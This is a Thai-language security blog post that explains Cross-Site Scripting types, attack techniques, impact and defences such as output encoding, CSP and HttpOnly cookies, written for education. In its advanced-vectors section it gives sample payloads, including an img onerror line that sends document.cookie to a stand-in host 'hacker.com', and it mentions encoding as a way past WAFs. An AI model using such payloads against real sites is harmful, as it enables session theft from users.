---
layout: post
title: "เจาะลึก Cross-Site Scripting (XSS)"
date: 2025-12-23
# ใช้ tags แทน เพื่อระบุกลุ่มเนื้อหาโดยไม่กระทบ URL
tags: [cybersecurity, security, web-safety]
---
เจาะลึก Cross-Site Scripting (XSS): จากช่องโหว่พื้นฐานสู่การโจมตีระดับสูง
Cross-Site Scripting (XSS) คือช่องโหว่ความปลอดภัยของเว็บแอปพลิเคชันที่เกิดขึ้นเมื่อผู้ไม่หวังดีสามารถ "ฝัง" สคริปต์ (มักเป็น JavaScript) ลงในหน้าเว็บที่ผู้ใช้อื่นกำลังเข้าชมได้ ผลลัพธ์คือสคริปต์นั้นจะทำงานภายใต้บริบทของเบราว์เซอร์ของผู้เหยื่อ ทำให้แฮกเกอร์สามารถขโมยข้อมูลสำคัญหรือควบคุมบัญชีผู้ใช้ได้

1. ประเภทของ XSS (The Three Pillars)
การแบ่งประเภท XSS ช่วยให้เราเข้าใจวิธีการที่สคริปต์ถูกส่งต่อและรันบนเครื่องของเหยื่อ:

1.1 Stored XSS (Persistent XSS)
เป็นประเภทที่อันตรายที่สุด เพราะสคริปต์จะถูกบันทึกลงใน Database ของเซิร์ฟเวอร์โดยตรง

ตัวอย่าง: แฮกเกอร์เขียนคอมเมนต์ในฟอรัมที่มีสคริปต์อันตราย เมื่อใครก็ตามเปิดอ่านกระทู้นั้น สคริปต์จะทำงานทันที

เป้าหมาย: ขโมย Cookie (Session Hijacking) หรือแพร่กระจายมัลแวร์ในวงกว้าง

1.2 Reflected XSS (Non-Persistent XSS)
สคริปต์ไม่ได้ถูกเก็บไว้ในเซิร์ฟเวอร์ แต่จะ "สะท้อน" กลับไปหาผู้ใช้ผ่านทาง URL หรือ Parameter

ตัวอย่าง: แฮกเกอร์ส่งลิงก์ที่มีสคริปต์แฝงใน Search Query เช่น https://example.com/search?q=<script>alert(1)</script>

เป้าหมาย: มักใช้ร่วมกับ Social Engineering (Phishing) เพื่อหลอกให้เหยื่อคลิก

1.3 DOM-based XSS
เป็น XSS รูปแบบใหม่ที่เกิดขึ้นบนฝั่ง Client-side เท่านั้น โดยสคริปต์จะทำงานผ่านการแก้ไข DOM (Document Object Model) ของหน้าเว็บผ่าน JavaScript ของตัวเว็บเอง

ตัวอย่าง: เว็บไซต์รับค่าจาก window.location.hash แล้วนำไปแสดงผลด้วย .innerHTML โดยไม่ผ่านการตรวจสอบ

2. กลไกการโจมตีเชิงลึก (Advanced Attack Vectors)
แฮกเกอร์ไม่ได้ใช้แค่ <script>alert(1)</script> อีกต่อไป แต่มีการใช้เทคนิคที่ซับซ้อนขึ้น:

Event Handlers Bypass: การใช้ Attribute ของ HTML เพื่อรันโค้ด

HTML

<img src="x" onerror="fetch('https://hacker.com/steal?cookie=' + document.cookie)">
<svg onload="alert(document.domain)">
Encoding & Obfuscation: การเข้ารหัสเพื่อหลบเลี่ยง Web Application Firewall (WAF)

ใช้ Base64 หรือ Hex encoding

ใช้ String concatenation ใน JavaScript เพื่อพรางตัวคำสั่ง

Blind XSS: การฝังโค้ดในส่วนที่แฮกเกอร์มองไม่เห็น (เช่น หน้า Admin Log หรือ Contact Form) แล้วรอให้เจ้าหน้าที่เปิดดูเพื่อให้สคริปต์ทำงานในสิทธิ์ระดับสูง

3. ผลกระทบของช่องโหว่ (Impact)
"XSS ไม่ใช่แค่การเด้งหน้าต่าง Alert แต่มันคือการยึดครองเบราว์เซอร์"

Session Hijacking: ขโมย document.cookie เพื่อเข้าสู่ระบบในชื่อของเหยื่อ

Phishing & Content Spoofing: เปลี่ยนแปลงหน้าเว็บเพื่อหลอกถามรหัสผ่าน (Fake Login Form)

Keylogging: ฝัง JavaScript เพื่อดักจับทุกการพิมพ์บนคีย์บอร์ด

XSS Worm: สคริปต์ที่สั่งให้บัญชีของเหยื่อส่งข้อความหรือโพสต์สคริปต์เดิมต่อไปหาเพื่อนโดยอัตโนมัติ

4. วิธีการป้องกันที่ถูกต้อง (Defense-in-Depth)
การป้องกัน XSS ต้องทำในหลายระดับพร้อมกัน:

A. Output Encoding (สำคัญที่สุด)
ต้องทำการ Encode ข้อมูลก่อนนำไปแสดงผลบน HTML เสมอ เพื่อให้เบราว์เซอร์มองว่ามันคือ "ข้อความ" ไม่ใช่ "คำสั่ง"

< เปลี่ยนเป็น &lt;

> เปลี่ยนเป็น &gt;

คำแนะนำ: ใช้ Library มาตรฐานเช่น DOMPurify สำหรับการทำ Sanitize

B. Content Security Policy (CSP)
ใช้ HTTP Header เพื่อกำหนดว่าเบราว์เซอร์สามารถรันสคริปต์จากแหล่งใดได้บ้าง

HTTP

Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.com;
การตั้งค่านี้จะบล็อก Inline Script และการรันสคริปต์จาก Domain ที่ไม่ได้รับอนุญาต

C. Use HttpOnly Cookies
การตั้งค่า Flag HttpOnly ในคุกกี้จะทำให้ JavaScript ไม่สามารถเข้าถึงคุกกี้นั้นได้ (document.cookie จะว่างเปล่า) ซึ่งป้องกัน Session Hijacking ได้เกือบ 100%

D. Modern Frameworks
การใช้ React, Angular หรือ Vue.js มีกลไกป้องกัน XSS ในตัว (Automatic Encoding) แต่ยังต้องระวังฟังก์ชันจำพวก dangerouslySetInnerHTML

สรุป
XSS เป็นช่องโหว่ที่ดูเหมือนง่ายแต่มีความซับซ้อนสูง การป้องกันที่มีประสิทธิภาพไม่ใช่การพยายามแบน "คำ" บางคำ (Blacklisting) แต่คือการจัดการบริบทของข้อมูล (Context-aware Encoding) และการใช้ระบบความปลอดภัยของเบราว์เซอร์อย่าง CSP เข้ามาช่วยเสริม

บทความนี้เขียนขึ้นเพื่อการศึกษาด้านความมั่นคงปลอดภัยไซเบอร์ (Cybersecurity Education)
